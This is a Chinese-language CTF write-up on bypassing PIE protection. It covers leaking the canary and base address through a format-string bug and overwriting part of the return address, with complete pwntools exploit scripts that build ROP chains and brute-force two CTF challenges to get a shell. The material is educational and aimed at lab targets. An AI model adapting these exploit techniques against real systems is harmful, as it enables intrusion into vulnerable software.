## 前言

**本文主要介绍在开启了PIE保护的情况下，绕过PIE保护获取shell的方法**

## PIE

**什么是PIE保护呢？这是官方的解释：**

PIE全称是position-independent
executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。

下面我们来看一个未开启pie保护的文件，常规操作，下载下来后首先checksec检查一下文件保护，没有开启PIE保护，这时我们注意到NO
PIE后面还有一个地址0x400000，这个地址是程序的加载基址

![](./img/7316341297869336590.png)

我们将程序拖入到ida中，我们可以看到.text段和.bss段的地址都是明确的，实际的值

![](./img/6708256385468991695.png)

![](./img/1530854615560267918.png)

现在我们再来看一下开启了pie保护的程序，checksec可以看到开启了pie保护

![](./img/5675740003489575047.png)

再拖入ida中看看，这里可以看到.text段的地址只剩下最后的四个数字了，这个地址并不是程序实际的运行地址，而是与程序加载基址之间的偏移量。如果没有开启pie保护，程序的加载基址默认是0x400000，现在开启了pie保护后每次运行程序的加载基址都是不同的

程序的实际运行地址 = 程序加载基址 + 程序偏移地址

![](./img/4193200042456854451.png)

## 关于开启了PIE保护程序的调试

由于程序开启了pie保护，当我们在使用pwngdb对程序进行调试的时候无法下断点

![](./img/8735793069708553824.png)

那我们就可以通过b
*$rebase(0x13F9)这种方式下断点调试，括号里面的是ida中反汇编出来的程序地址偏移量，需要注意的是在下断点调试之前，程序要先执行一次

![](./img/8882381118786998898.png)

**下面来讲一下面对pie保护的绕过方法**

## 格式化字符串泄露真实地址

**如果程序中存在一个格式化字符串漏洞，我们就可以配合格式化字符串漏洞将程序某个函数的真实地址泄露出来**

**[深育杯 2021]find_flag**  
[题目地址](https://www.nssctf.cn/problem/774 "题目地址")

checksec一下看到开启了全保护

![](./img/8181459238951172497.png)

将程序拖入到ida中进行反汇编，shift+F12查看程序中的字符串，可以看到存在system函数和cat
flag.txt的字符串，而且也存在栈溢出漏洞，那我们就可以构造ROP链来获取flag了

![](./img/2594661659036601619.png)

但由于程序开启了pie保护，我们必须要先得到程序的实际运行地址才能构造ROP链。接着反汇编main函数，发现其中存在一个格式化字符串漏洞，那我们就可以通过格式化字符串漏洞泄露出某一条指令的真实地址，再用真实地址减去偏移地址，就能得到程序的加载基址了

![](./img/4479895900430211876.png)

利用pwngdb调试，b *$rebase(0x136c)在偏移量为0x136c的地方下断点，下完断点后执行程序

![](./img/128864043518796547.png)

到断点处停下后stack
40查看栈结构，第一个箭头指向的地方就是canary的值，第二个箭头指向的地址是0x55555555546f，该地址上执行的指令是mov eax, 0，

![](./img/8311628191342453702.png)

我们再在ida上寻找这条指令的偏移地址，可以看到偏移地址是0x146F，那我们就能得到程序加载基址等于0x55555555546f-0x146F，得到了程序加载基址后就能构造ROP链获取flag了

![](./img/8657697458228894396.png)

完整exp:

    
    
    from pwn import *
    
    context.os = 'Linux'
    context.arch = 'amd64'
    context.log_level = 'debug'
    
    p = remote('node4.anna.nssctf.cn', 28696)
    elf = ELF('../find_flag')
    
    # get canary and addr
    p.recvuntil('name?') 
    p.sendline('%17$paaaa%19$p')
    p.recvuntil('0x')
    canary = int(p.recv(16), 16)
    log.success('canary: '+str(canary))
    p.recvuntil('aaaa')
    base_addr = int(p.recv(14), 16) - 0x146F
    log.success('base_addr: '+str(base_addr))
    
    system_addr = elf.sym['system'] + base_addr
    flag_addr = 0x1231 + base_addr
    ret_addr = 0x101a + base_addr
    
    #ROP
    payload = b'a'*(0x40-0x8) + p64(canary) + b'a'*0x8 + p64(ret_addr) + p64(flag_addr) + p64(system_addr)
    p.recvuntil('else?')
    p.sendline(payload)
    
    p.interactive()
    

![](./img/5159222305430091739.png)

## partial write

**partial
write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位
(按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。**

简单来说就是不管程序加载基址怎么变化，偏移量和真实地址的最后三位都是一样的，各位可以参考一下深育杯的那一道题，偏移量是0x146f，真实地址就是0x55555555546f

**2018 - 安恒杯 - babypie**  
[题目地址](https://buuoj.cn/challenges#linkctf_2018.7_babypie/ "题目地址")

checksec看一下保护，开启了全保护

![](./img/1413285589640886482.png)

拖入到ida中，反汇编发现存在getshell函数，

![](./img/8009245360016304292.png)

可以看到存在明显的栈溢出，canary可以通过printf带出来，现在缺少的是sub_a3e函数的真实地址，那这里就能通过partial
write将返回地址修改成system函数的地址

![](./img/3964397547399007809.png)

由于每次运行程序是程序加载的基址都不相同，假设某次程序运行时的基址是0x400000，getshell函数的偏移量是0xA3E，那getshell函数的真实地址就是0x400A3E，  
正常的返回地址偏移量是0x576，那真实返回地址就是0x400576，我们可以看到无论程序怎么运行，函数之间真实地址的差别是有后3位是不同的，前几位地址都是一样的，那我们就可以通过只修改返回地址的后3位来改变程序的执行流

下面画了一张帮助理解：

![](./img/8623459738021204425.png)

我们可以通过栈溢出覆盖掉buf和rbp的内容，再修改return
addr的后三位数，因为我们无法修改一个半字节，所以我们只能修改两个字节，我们将return
addr中的\x76修改成\x3e，\x05就有16种结果了，因为我们知道的只有后三位数，倒数第四位数我们是不知道的，所以就有[\x0a,\x1a,\x2a,\x3a,\x4a,\x5a,\x6a,\x7a,\x8a,\x9a,\xaa,\xba,\xca,\xda,\xea,\xfa]，我们稍微爆破一下就好了

完整exp：

    
    
    from pwn import *
    
    context.os = 'Linux'
    context.arch = 'amd64'
    context.log_level = 'debug'
    
    p = remote('node4.buuoj.cn', 25238)
    
    p.sendafter('Name:\n', b'a'*0x29)
    p.recvuntil(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    canary = u64(p.recv(7).rjust(8, b'\x00'))
    print('canary:'+str(canary))
    
    payload = b'a'*(0x30-0x8) + p64(canary) + b'a'*0x8 + b'\x3E\xaa'
    p.sendafter('\n',payload)
    p.interactive()
    

我这里的脚本是固定地址的，有十六分之一的概率运行成功，不行的话多运行几次就行了，或者写一个爆破脚本

![](./img/6550736188621140580.png)

